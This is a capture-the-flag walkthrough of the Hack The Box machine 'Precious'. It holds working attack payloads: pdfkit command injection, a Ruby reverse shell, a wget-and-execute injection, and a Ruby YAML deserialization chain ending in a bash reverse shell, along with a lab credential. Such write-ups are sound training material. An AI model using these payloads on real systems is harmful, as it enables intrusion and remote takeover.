<div class="banner">
    <div class="ads">
        <span></span>
        Get Free - Docs template
    </div>
    <h1>
        <span>¿By Vishok - Hacking Pentesting?</span>
        Precious HTB
    </h1>
</div>

####
####
####
## Open ports in the target machine
### Nmap:
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
22/tcp open  ssh
80/tcp open  http
```
####
Result of the nmap scan:
####
```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
####
####
####
## Services that are running in the target machine
### HTTP:
In the previous **nmap** scan, we are able to see a domain, so that is clear hint that the machine do a *Virtual hosting*, is necessary to relate this domain with the **ip** address of the target machine, putting it into the `/etc/hosts` file. So the first preview of the *HTTP* service look like this:
####
<div class="img">
    <img src="/machines/public/precious/1.png" loading="lazy" decoding="async" />
</div>

####
The web application allow us to fetch a **web page** and transform that web in *PDF* file. So we will try to find any **sensitive** information, but this not work. The web site request a valid **url**. Therefore a code injection, sqli, XSS, etc, not work here. Is necessary to intercept the request to see more information about how are builting the request and see if exist a **parameters** that we could exploit.
####
```ruby
OST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://precious.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://precious.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F127.0.0.1 -> Parameter url
```
####
Although we insert a valid url into the **url** parameter, the web application not create a *PDF* file, however what happend if we try to concat a command? Like this: `http://127.0.0.1;ls`, this time the web application respond us and create a *PDF* file. We could supose that if we insert the `ls` command the PDF file have the output of this command, but not, the PDF file is blank.
####
<div class="img">
    <img src="/machines/public/precious/2.png" loading="lazy" decoding="async" />
</div>

####
But we already now that the command injection affect in so form to the website. In the respond we could see a version of tool that the service use to generate the PDF file: [*Pdfkit v0.8.6*], so we will try to exploit this version looking for any exploit in databases like **github** and **explot-db**. And we found one: [Pdfkit v0.8.7.2 - Command Injection](https://www.exploit-db.com/exploits/51293). When we execute that payload indicading a command for example: `ping -c -1 10.10.16.2` we don't now if that function.
####
So to verify if that command was execute, we could use tools like **tcpdump**:
####
```bash
sudo tcpdump -i tun0 icmp
```
####
| Tcpdump param | Description |
| ----- | ----- |
| -i | Indicate the interface |
| icmp | Especify that listen only for *ICMP* traffic |
####
The result is the next:
####
```ruby
15:05:51.242267 IP precious.htb > 10.10.16.2: ICMP echo request, id 20036, seq 1, length 64
15:05:51.242295 IP 10.10.16.2 > precious.htb: ICMP echo reply, id 20036, seq 1, length 64
```
####
<div class="warning">

> Wrap custom command in **quotes** if it has spaces.
</div>

####
####
####
## First explotation phase
### Ruby
Having that informacion and seeing the other information that the exploit show us as output terminal: `PAYLOAD: http://%20'ping -c 1 10.10.16.2'`, we could craft the same payload without the huge amount of code lines that posses the exploit.
####
<div class="tip">

> Is thime to craft our custom script the will help us to automate the **code execution** in the target machine.
</div>

####
```python
#!/usr/bib/python3

import requests

def main():
    url = 'http://precious.htb'
    param = 'url'
    command = 'http://%20`ping -c 1 10.10.16.2`'

    response = requests.post(url=url, params={param: command})
    print(response.text)

if __name__ == '__main__':
    main()
```
####
The server can't make a revershell via **bash** or **sh** with the common *One-liners*, we don't now if in background are running **python**, because we could craft a script in python trying to connect us using **sockets**. One way to find the version of the services that run in the target machine is using **whatweb**:
####
```ruby
whatweb 10.10.11.143

Result ->
http://10.10.11.189 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.189], RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0]
http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
####
The machine posses a **ruby**, furthermore we could looking for revershell codes using ruby. I found one revershell code: [Revershell-Socket-Code](https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325). We need to modify one line: `s.connect Socket.sockaddr_in <port_local_host>, '<ip_local_host>'`. We could insert this code as payload in our python script or insert that code into a `.rb` file and download that file using **wget**:
####
```ruby
touch revshell.rb

    #!/usr/bin/env ruby
    # syscall 33 = dup2 on 64-bit Linux
    # syscall 63 = dup2 on 32-bit Linux
    # test with nc -lvp 1337 

    require 'socket'

    s = Socket.new 2,1
    s.connect Socket.sockaddr_in 1234, '10.10.16.2'

    [0,1,2].each { |fd| syscall 33, s.fileno, fd }
    exec '/bin/sh -i'
```
####
In the target machine:
####
```python
#!/usr/bib/python3

import requests

def main():
    url = 'http://precious.htb'
    param = 'url'
    command = 'http://%20`wget http://10.10.16.2:8000/revshell.rb -O /tmp/revshell.rb && ruby /tmp/revshell.rb`'

    response = requests.post(url=url, params={param: command})
    print(response.text)

if __name__ == '__main__':
    main()
```
####
| Wget param | Description |
| ----- | ----- |
| -O | Output file, especify the name and the path of that file |
####
This access is not adequate because it does not give us a fully interactive shell, so we will have to treat the *TTY* before proceeding with privilege escalation. This process is called: *TTY treatment*.
####
```ruby
1. script -c bash /dev/null
2. ctrl + z
3. stty raw -echo; fg
4. 	  reset xterm
5. export TERM=xterm
```
####
####
####
## Lateral movement
### Bundle:
At the moment to gain access in the target machine, listing the content of the `/home` directory, we ar able to see that our user haven't the **user flag**. Furthermore, must exist other user, effectively doing the next: `ls /home` we can see that exist the `henry` user. So is necessary to get the password of that user and make *Lateral movement*. When we listing the hide content in the `~` of the **henry** user a `.bundle` directory exist.
####
That directory is uncommon, we need to check the content of that directory, this have a **config** file, this file have the next information:
####
```yaml
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
####
Valid credential were founded in that file. We could use this credentials against **henry** user: `su henry` or using *SSH*.
####
####
####
## Second exploit phase (Privilage Escalation)
### Yaml:
The first thing is verify if we have **root** permissions over some binarie: `sudo -l`, we realise that we can execute `/usr/bin/ruby /opt/update_dependencies.rb` as **root**. Cat that binarie show us that file perfom a *YAML dependencies injection* using **yaml** and **gems**. So we could try to inject a malicious code in that file. Looking in internet how we can exploit that vulnerability found this: [Remote-code-execution-yaml-deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/).
####
The article structure code is so:
####
```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.wkkib01k9lsnq9qm2pogo10tmksagz.burpcollaborator.net/443'"
         method_id: :resolve
```
####
The payload is injected in the **git_set** param. So we could sustitute the current payload with this: `git_set: "bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'`. The **update_dependencies.rb** file wait dependencies from a **dependencies.yml** file. So we need to create a **dependencies.yml** file in `/tmp` and paste the previuos payload. Finally, we execute: `sudo /usr/bin/ruby /opt/update_dependencies.rb` in the target machine and in our machine: `nc -nvlp 4444`.
